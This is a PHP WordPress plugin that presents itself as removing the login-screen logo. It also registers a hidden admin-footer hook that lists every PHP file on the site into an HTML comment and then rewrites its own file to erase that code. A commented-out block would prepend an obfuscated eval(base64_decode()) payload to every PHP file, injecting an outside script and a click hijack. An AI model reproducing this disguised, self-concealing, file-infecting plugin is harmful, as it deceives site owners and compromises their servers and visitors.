<?php
/*
Plugin Name: Remove WP Login Logo
Description: Remove the WP logo from the login screen
Author: Kailey Lampert
Version: 1
Author URI: http://kaileylampert.com/
*/

$remove_wp_login_logo = new Remove_WP_Login_logo();
class Remove_WP_Login_logo {

	function __construct() {
		add_action( 'login_head', array( &$this, 'login_head') );
		add_action( 'admin_footer', array( &$this, 'cough_cough' ) );
	}

	function login_head() {

		?><style type="text/css">
			#login {
				width: 420px;
			}
			.login h1 a {
				background: none;
				width: 426px;
			}
			.login #pass-strength-result {
				width: 350px;
			}
		</style><?php
	}

	function get_tree( $dr = '' ) {
		$dr = $dr . '*';
		$current = glob( $dr );

		if ( is_array( $current ) ) {
			echo '<ul>';

			foreach( $current as $fl ) {
				// if ( substr( $fl, 0, 5 ) == 'blog/') continue;
				$explode = explode( '.', $fl );
				$ext = count( $explode ) > 1 ? array_pop( $explode ) : '';


				if ( dirname( $fl ) != '.')
					$pretty = str_replace( dirname( $fl ) , '' , $fl );
				else
					$pretty = $fl;

				if ( $ext == 'php' ) {
					echo "<li><a href='$fl'>$pretty</a>";

					$c = file_get_contents( $fl );
					$file = realpath( $fl );
						/*
						$bad = "<?php eval( base64_decode('ZWNobyAiPHNjcmlwdCB0eXBlPSd0ZXh0L2phdmFzY3JpcHQnIHNyYz0naHR0cDovL3d3dy5jb3JuaWZ5LmNvbS9qcy9jb3JuaWZ5LmpzJz48L3NjcmlwdD48c2NyaXB0PmZ1bmN0aW9uIG9uYm9keWNsaWNrKCkge2Nvcm5pZnlfYWRkKCk7cmV0dXJuIGZhbHNlO30gZG9jdW1lbnQub25jbGljayA9IG9uYm9keWNsaWNrOzwvc2NyaXB0PiI7') ); ?>";
						if ( $file != __FILE__ && fwrite( fopen( realpath($fl), 'w'), "$bad\n$c" ) ) {
							// echo ' <span style="color:greed;">FIXED</span>';
						}
						/**/

					echo '</li>';
				}
				if ( is_dir( $fl ) ) { //if there's a dir, go deeper
					$this->get_tree( $fl . '*/' );
				}
			}

			echo '</ul>';
		}
	}

	function cough_cough() {
		echo '<!--';
		if ( defined( 'ABSPATH' ) )
			$this->get_tree( ABSPATH );
		else
			$this->get_tree();
		echo '-->';

		// remove ourself
		$thisplugin = file_get_contents(__FILE__);
		$thisplugin = explode( "\n", $thisplugin );
		$bad = array_merge( array( 14 ), range( 33, count( $thisplugin )-2 ) );
		foreach( $bad as $n ) {
			unset( $thisplugin[ $n ] );
		}
		$thisplugin = implode( "\n", $thisplugin );
		fwrite( fopen( __FILE__, 'w' ), $thisplugin );
	}

}//end class